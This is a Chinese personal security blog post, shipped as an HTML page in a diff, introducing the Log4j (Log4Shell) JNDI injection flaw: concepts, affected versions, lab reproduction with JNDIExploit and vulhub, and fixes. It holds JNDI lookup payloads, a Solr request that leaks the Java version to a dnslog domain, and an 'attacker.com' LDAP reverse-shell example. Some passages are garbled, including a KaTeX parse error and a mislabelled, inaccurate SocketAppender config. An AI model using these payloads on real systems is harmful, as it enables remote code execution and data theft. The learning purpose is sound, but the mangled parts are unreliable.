@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        logj漏洞初识 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">logj漏洞初识</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag">#java安全</a>
+  
+
+
+          <span class="post-date">2023-03-09</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-text">基础概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞复现和利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%BF%AB%E9%80%9F%E5%A4%8D%E7%8E%B0"><span class="toc-text">本地快速复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87vulhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-text">通过vulhub靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-text">修复</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/123181812">https://blog.csdn.net/HBohan/article/details/123181812</a></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache Log4j-2存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用可以造成任意代码执行。</p>
+<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ul>
+<li><p>log4j是什么？</p>
+<p> Apache的开源项目log4j是一个功能强大的日志组件（框架）,提供方便的日志记录。 </p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9fca47678ba4">https://www.jianshu.com/p/9fca47678ba4</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844904147167395848">https://juejin.cn/post/6844904147167395848</a></p>
+</li>
+<li><p>lookup</p>
+<p>log4j中的Lookup机制允许使用JNDI来动态地管理日志记录器的配置信息 ，lookup的本意是方便开发人员进行调试的时候查看环境变量等信息，但是同时也可以被恶意利用，它不仅可以用来回显环境变量，还可以进行jndi注入，我暂时简单理解为log4j利用的本质就是一种jndi注入。</p>
+<p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540528.png" alt="image-20230314154011461"></p>
+</li>
+<li><p>Maven</p>
+<p>  Maven是一个Java项目管理工具，它可以帮助开发人员自动化构建、测试、部署和管理Java项目。 </p>
+<p> Maven的主要功能包括：</p>
+<ul>
+<li>项目管理：Maven可以自动创建项目结构和文件，包括源代码目录、资源目录和测试目录等。</li>
+<li>依赖管理：Maven可以自动下载和管理项目所需的依赖库，并且可以通过中央仓库和私有仓库来管理依赖库。</li>
+<li>构建管理：Maven可以自动化执行项目的编译、测试、打包和部署等构建任务，可以通过插件来扩展构建任务。</li>
+<li>文档生成：Maven可以根据项目的源代码和注释生成项目文档，并且可以通过插件来扩展文档生成功能。</li>
+</ul>
+</li>
+<li><p>JNDI</p>
+<p> 翻译过来就是 java命名和目录接口 ，是一组在java应用中访问命名和目录服务的API，命名服务将名称和对象联系起来，使得我们可以用名称访问对象，在Java平台中，有多个JNDI的实现类可供选择，其中一些主要的实现类包括：</p>
+<ol>
+<li>LDAP provider：是基于X.500标准的轻量级目录访问协议，用于访问LDAP服务器，通过JNDI API可以实现连接、搜索、读取、修改等操作。Java平台中提供了一个LDAP provider，支持访问大多数LDAP服务器，如Microsoft Active Directory、OpenLDAP等。</li>
+<li>RMI provider：用于访问远程对象，通过JNDI API可以实现在不同Java虚拟机之间的对象传输。Java平台中提供了一个RMI provider，支持远程对象的查找和绑定等操作。可以实现java远程方法调用</li>
+<li>DNS provider：用于访问DNS服务，通过JNDI API可以实现域名解析、查找DNS条目等操作。Java平台中提供了一个DNS provider，支持访问常见的DNS服务器。</li>
+</ol>
+</li>
+<li><p>JNDI注入</p>
+<p>当你开发 Java 应用程序时，你可能需要访问外部资源，JNDI提供了在 Java 应用程序中访问外部资源的方法，让你可以像访问文件系统一样访问外部资源。</p>
+<p>JNDI 注入是一种将外部资源注入到 Java 应用程序中的方式。</p>
+<p>攻击者利用JNDI注入漏洞的一般过程如下：</p>
+<ol>
+<li>攻击者发送恶意数据，例如通过Web表单或URL参数等输入。</li>
+</ol>
+</li>
+</ul>
+<ol start="2">
+<li>恶意数据包含特殊的JNDI注入payload，用于欺骗JNDI上下文对象，使其执行非预期的操作。</li>
+<li>JNDI上下文对象执行恶意操作，例如读取文件、执行命令等。</li>
+</ol>
+<p>  例如，可以利用RMI把恶意代码写在远程服务器上，然后进行JNDI注入，让远程服务器的代码执行，类似于php的文件包含</p>
+<p>  {jndi:rmi//xxx.xxx.xxx}</p>
+<p>  {jndi:ldap//xxx.xxx.xxx}</p>
+<ul>
+<li>JNDI注入工具 <strong><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection</a></strong>  <strong><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></strong></li>
+</ul>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>综上大致得到了对于log4j漏洞的基本认识， Log4j是一个Java日志框架，允许开发人员按照不同的方式记录日志。其中一个重要的特性就是lookup机制，它允许用户在日志输出中使用占位符，并动态地替换这些占位符为实际的值。 Log4j的lookup机制可以通过使用“${}”语法来实现。具体来说，可以在日志输出中使用“${}”，并在运行时通过设置相关的属性来替换这些占位符。例如，可以使用以下语句在日志输出中引用环境变量：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logger.info(<span class="string">&quot;The value of the HOME environment variable is $&#123;env:HOME&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，“${env:HOME}”是一个lookup表达式，它告诉Log4j在运行时查找名为“HOME”的环境变量，并将其替换为实际的值。</p>
+<p>更多lookup相关可以查看文档：<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/manual/lookups.html">https://logging.apache.org/log4j/2.x/manual/lookups.html</a></p>
+<p>以下是lookup支持输出的环境变量</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141540950.png" alt="image-20230314154032871"></p>
+<p> 除了环境变量之外，Log4j还支持其他类型的lookup。</p>
+<ol>
+<li>系统属性：通过使用<code>$&#123;sys:propertyName&#125;</code>语法，可以引用JVM中的系统属性，其中<code>propertyName</code>是系统属性的名称。</li>
+<li>Java JNDI：使用<code>$&#123;jndi:contextName:propertyName&#125;</code>语法，可以在JNDI上下文中查找属性值，其中<code>contextName</code>是JNDI上下文的名称，<code>propertyName</code>是要查找的属性的名称。</li>
+<li>本地变量：使用<code>$&#123;local:variableName&#125;</code>语法，可以引用在当前线程中定义的本地变量，其中<code>variableName</code>是变量的名称。</li>
+<li>随机数：使用<code>$&#123;random&#125;</code>语法，可以生成一个随机数。</li>
+<li>时间戳：使用<code>$&#123;date&#125;</code>语法，可以生成当前日期和时间的时间戳，格式可以根据需要进行指定。</li>
+</ol>
+<p>也即 Log4j2默认支持解析ldap/rmi协议，并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。 </p>
+<p>主要问题出现在lookup支持Java JNDI, 是有可能造成JNDI注入的，或者说log4j漏洞的利用方式本质上就是JNDI注入。</p>
+<p>攻击者可以通过构造一个恶意的JNDI URL，注入到web站点接收日志消息的地方，发送给Log4j 2.x框架来利用该漏洞。当Log4j 2.x框架在处理该日志消息时，它会尝试查找该JNDI URL中指定的上下文和属性，这可能会导致恶意代码的执行。攻击者可以使用此漏洞来执行任意代码，包括在目标系统上执行命令、窃取敏感数据等。 </p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>日志处理模块 Apache Log4j 2.x &lt;= 2.14.1 </p>
+<p>jdk版本 &lt;=”1.8.0_121”</p>
+<h1 id="漏洞复现和利用"><a href="#漏洞复现和利用" class="headerlink" title="漏洞复现和利用"></a>漏洞复现和利用</h1><h2 id="本地快速复现"><a href="#本地快速复现" class="headerlink" title="本地快速复现"></a>本地快速复现</h2><p><a target="_blank" rel="noopener" href="https://github.com/Yihsiwei/Log4j-exp">https://github.com/Yihsiwei/Log4j-exp</a></p>
+<p> 下载<code>Log4j-exp</code> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/feihong-cs/JNDIExploit</span><br></pre></td></tr></table></figure>
+
+
+
+<p>开启JNDI服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.31.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541883.png" alt="image-20230314154100815"></p>
+<p>这里相当于受害站点</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541627.png" alt="image-20230314154122566"></p>
+<p>打一个jar包并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -jar Log4j-rce.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541947.png" alt="image-20230314154142857"></p>
+<h2 id="通过vulhub靶场复现"><a href="#通过vulhub靶场复现" class="headerlink" title="通过vulhub靶场复现"></a>通过vulhub靶场复现</h2><p>攻击机： kali         192.168.111.128</p>
+<p>靶机：    ubuntu    192.168.111.139</p>
+<p>已提前装好ssh、curl、pip等工具</p>
+<p>安装docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
+
+<p>docker -v查看是否安装成功</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141541298.png" alt="image-20230314154157250"></p>
+<p>安装docker-compose</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt  install docker-compose</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure>
+
+<p> docker-compose -v 查看版本</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542399.png" alt="image-20230314154213351"></p>
+<p>vulhub下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+
+<p>启动环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>这里我这个命令一直报错，sudo就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up</span><br></pre></td></tr></table></figure>
+
+<p>这里测试tomcat ,开起来了</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542373.png" alt="image-20230314154226330"></p>
+<h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>进入相关目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/log4j/CVE-2021-44228</span><br></pre></td></tr></table></figure>
+
+<p>拉取镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d --build</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141542994.png" alt="image-20230314154243936"></p>
+<p>查看端口信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543433.png" alt="image-20230314154300382"></p>
+<p>访问</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.139:8983/solr/#/">http://192.168.111.139:8983/solr/#/</a></p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303141543412.png" alt="image-20230314154315337"></p>
+<p>在Dnslog拿一个域名用来测试：   2xwogd.dnslog.cn </p>
+<p>访问</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.111.139:8983/solr/admin/cores?action=KaTeX">http://192.168.111.139:8983/solr/admin/cores?action=KaTeX</a> parse error: Expected ‘}’, got ‘EOF’ at end of input: {jndi:ldap://{sys:java.version}.2xwogd.dnslog.cn }</p>
+<p>做到这里了：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46683781/article/details/122226317">https://blog.csdn.net/weixin_46683781/article/details/122226317</a></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>Log4j漏洞可以被利用反弹shell是因为它涉及到了一个名为JNDI(Java Naming and Directory Interface)的Java API。在这种漏洞利用中，攻击者可以通过构造特定的JNDI数据源名称，将其作为参数传递给Log4j，然后触发Log4j的JNDI lookup操作，从而将攻击者指定的远程服务器IP地址和端口号作为参数传递给JNDI数据源名称。</p>
+<p>这种攻击方式被称为JNDI注入攻击，它利用了JNDI的某些不安全的特性，可以让攻击者在目标系统上执行远程代码，包括反弹shell等操作。</p>
+<p>具体地，攻击者可以构造如下的JNDI数据源名称：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascriptCopy codeldap://attacker.com:1389/Exploit</span><br></pre></td></tr></table></figure>
+
+<p>其中，<code>ldap</code>表示协议名称，<code>attacker.com</code>表示攻击者控制的远程服务器IP地址，<code>1389</code>表示远程服务器监听的端口号，<code>Exploit</code>为任意名称。</p>
+<p>当受害者使用了受漏洞影响的Log4j版本，并且在应用程序中使用了类似以下的Log4j配置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">phpCopy code&lt;appender name=&quot;test&quot; class=&quot;org.apache.log4j.net.SocketAppender&quot;&gt;</span><br><span class="line">    &lt;param name=&quot;RemoteHost&quot; value=&quot;ldap://attacker.com&quot;/&gt;</span><br><span class="line">    &lt;param name=&quot;Port&quot; value=&quot;1389&quot;/&gt;</span><br><span class="line">    &lt;param name=&quot;ReconnectionDelay&quot; value=&quot;10000&quot;/&gt;</span><br><span class="line">&lt;/appender&gt;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以利用构造的JNDI数据源名称，欺骗Log4j将攻击者指定的远程服务器IP地址和端口号传递给JNDI lookup操作，从而导致攻击者成功地反弹shell或执行其他远程代码。</p>
+<p>因此，为了防止Log4j漏洞被利用反弹shell等操作，需要及时升级受影响的Log4j版本，并关闭JNDI lookup功能，或对JNDI数据源名称进行严格限制和验证。</p>
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>用户：</p>
+<ul>
+<li><p>禁用lookup或JNDI服务</p>
+</li>
+<li><p>升级Apache Log4j和jdk版本</p>
+</li>
+</ul>
+<p>Apache Log4j漏洞的修复主要涉及以下两个方面：</p>
+<ol>
+<li>修复漏洞代码：修复了漏洞代码，以防止攻击者利用漏洞进行攻击。 Log4j漏洞的根本原因在于JNDI Lookup和相关函数中存在的漏洞代码，攻击者可以通过利用此漏洞在受害者的系统中执行任意代码。因此，修复漏洞代码的方案主要集中在禁用JNDI Lookup和相关函数、增强输入验证、使用安全类加载器等方面。 </li>
+<li>加强安全机制：在修复漏洞的同时，Apache Log4j也采取了一些措施来加强安全机制，以防止类似漏洞再次出现。具体来说，Apache Log4j采取了以下措施：<ul>
+<li>添加安全警报：在Log4j配置中，添加了一个新的安全警报机制，以便及时通知管理员有关异常和潜在的安全问题。</li>
+<li>增加日志信息：在日志记录中增加了更多的详细信息，以帮助管理员更好地跟踪和排查潜在的安全问题。</li>
+<li>提供安全建议：在官方的安全公告中，提供了一些安全建议和最佳实践，以帮助管理员更好地保护其系统和应用程序的安全。</li>
+</ul>
+</li>
+</ol>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/03/11/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>不同数据库</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/03/04/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      汇编基础
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
